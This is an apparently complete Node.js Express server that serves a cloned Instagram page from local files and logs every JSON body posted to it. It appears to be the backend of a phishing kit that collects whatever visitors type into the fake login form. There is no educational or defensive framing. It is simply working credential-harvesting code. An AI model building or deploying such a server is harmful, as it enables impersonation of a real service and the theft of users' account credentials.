const express = require("express");
const path = require("path");
const app = express();

app.use(express.static("Instagram_files"));
app.use(express.json());

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "/instagram.html"));
});

app.post("/", (req, res) => {
  content = req.body;
  console.log(content);
  res.status(200).json({ status: "ok" });
});

app.listen(3000, () => {
  console.log("app is running in port 3000");
});
